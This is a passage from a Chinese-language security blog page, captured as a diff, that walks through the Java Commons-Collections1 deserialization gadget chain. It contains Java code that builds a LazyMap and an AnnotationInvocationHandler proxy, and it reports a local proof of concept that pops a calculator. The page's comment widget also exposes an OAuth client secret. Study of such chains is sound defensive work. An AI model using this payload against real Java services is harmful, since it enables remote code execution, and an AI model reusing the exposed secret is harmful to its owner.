+    <span style=color:#75715e>// create lazyMap with transformer
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>final</span> Map innerMap <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>();</span>
+    <span style=color:#66d9ef>final</span> Map lazyMap <span style=color:#f92672>=</span> LazyMap<span style=color:#f92672>.</span><span style=color:#a6e22e>decorate</span><span style=color:#f92672>(</span>innerMap<span style=color:#f92672>,</span> transformerChain<span style=color:#f92672>);</span>
+
+    <span style=color:#75715e>// create handler2 with lazyMap
+</span><span style=color:#75715e></span>    <span style=color:#75715e>// Since AnnotationInvocationHandler is an internal class, it cannot be directly instantiated, so it is
+</span><span style=color:#75715e></span>    <span style=color:#75715e>// necessary to use reflection to construct
+</span><span style=color:#75715e></span>    Class clazz <span style=color:#f92672>=</span> Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span style=color:#f92672>);</span>
+    Constructor constructor <span style=color:#f92672>=</span> clazz<span style=color:#f92672>.</span><span style=color:#a6e22e>getDeclaredConstructor</span><span style=color:#f92672>(</span>Class<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Map<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
+    constructor<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
+    InvocationHandler handler <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>InvocationHandler<span style=color:#f92672>)</span> constructor<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>(</span>Retention<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> lazyMap<span style=color:#f92672>);</span>
+
+    <span style=color:#75715e>// create proxyMap with handler
+</span><span style=color:#75715e></span>    Map proxyMap <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>Map<span style=color:#f92672>)</span> Proxy<span style=color:#f92672>.</span><span style=color:#a6e22e>newProxyInstance</span><span style=color:#f92672>(</span>
+            Map<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getClassLoader</span><span style=color:#f92672>(),</span>
+            <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]{</span>Map<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span>
+            handler
+    <span style=color:#f92672>);</span>
+    
+    <span style=color:#75715e>// create handler with proxyMap
+</span><span style=color:#75715e></span>    handler <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>InvocationHandler<span style=color:#f92672>)</span> constructor<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>(</span>Retention<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> proxyMap<span style=color:#f92672>);</span>
+
+    <span style=color:#66d9ef>return</span> handler<span style=color:#f92672>;</span>
+<span style=color:#f92672>}</span>
+</code></pre></div><p>稍微做了一点修改，测试时发现 transformers 链的最后如果返回 1 的话会抛出异常：</p>
+<p><img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/vulns/java/cc1/exception.png alt=Exception></p>
+<p>稍微看一下就可以明白这里是因为返回了 Integer 型的数据，而 memberValues.entrySet 是一个 Set 类型的数据，无法转换所以抛出了异常，所以可以设置返回一个 Set 来尝试解决这个问题。</p>
+<h2 id=poc-测试>PoC 测试</h2>
+<p>测试将返回的对象序列化再反序列化，看是否会弹出：</p>
+<p><img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/vulns/java/cc1/success.png alt=success></p>
+<p>本地测试成功弹出了计算器。</p>
+</div>
+</div>
+<div class=w-200>
+<div id=gitalk></div>
+<script>var gitalk=new Gitalk({clientID:'9a04c6b451fbce76511d',clientSecret:'430c540c77ecd6b59749c60f0341c057bd5320a0',repo:'Causa1ity.github.io',owner:'Causa1ity',admin:'Causa1ity',id:'/security/javasec/commonscollections1/',distractionFreeMode:!1});gitalk.render('gitalk')</script>
+</div>
+</div>
+</div>
+<script>CodeLine.initOnPageLoad({copyBtn:{show:!0,position:'top'},toggleBtn:{show:!1}})</script>
+<div class="text-center my-8">
+<span class="font-serif text-lg">
+Powered By <a href=https://gohugo.io/ class="font-bold hover:text-blue-400">Hugo</a>
+with theme <a href=https://github.com/causa1ity/hugo-theme-noth/ class="font-bold hover:text-blue-400">Noth</a>
+</span>
+</div></body>
+</html>
